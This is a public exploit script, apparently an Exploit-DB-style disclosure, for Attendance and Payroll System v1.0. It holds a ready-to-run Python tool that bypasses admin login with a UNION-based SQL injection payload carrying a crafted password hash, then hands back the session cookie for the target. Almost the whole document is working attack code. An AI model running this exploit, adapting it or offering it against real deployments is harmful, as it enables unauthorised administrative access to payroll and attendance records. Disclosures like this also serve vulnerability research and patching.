# Exploit Title: Attendance and Payroll System v1.0 - SQLi Authentication Bypass
# Date: 04/03/2022
# Exploit Author: pr0z
# Vendor Homepage: https://www.sourcecodester.com
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/apsystem.zip
# Version: v1.0
# Tested on: Linux, MySQL, Apache

import requests
import sys
from requests.exceptions import ConnectionError


print('\n    >> Attendance and Payroll System v1.0')
print('    >> Authentication Bypass through SQL injection')
print('    >> By pr0z\n')

login_path = ':81/admin/login.php'
index_path = ':81/admin/index.php'

payload = "username=joe' UNION SELECT 1 as id, 'joe' as username, '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK' as password ,'zzz' as firstname,'zzz' as lastname,'zzz.php' as photo, '2018-04-30' as created_on -- &password=test&login="
headers = {'Content-Type': 'application/x-www-form-urlencoded'}
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


# Check for arguments
if len(sys.argv) < 2 or '-h' in sys.argv:
    print("[!] Usage: python3 apsystem_sqli.py http://127.0.0.1")
    sys.exit()

# Bypass Authentication
target = sys.argv[1]
print("[+] Extracting Administrator cookie using SQLi ...")
sess = requests.Session()
try:
    sess.get(target + index_path,headers=headers, verify=False)
    sess.post(target + login_path, data=payload, headers=headers,verify=False)
except ConnectionError:
    print('[-] We were unable to establish a connection')
    sys.exit()

cookie_val = sess.cookies.get_dict().get("PHPSESSID")

print("[+] Use the following cookie:\n")
print(f"PHPSESSID: {cookie_val}")
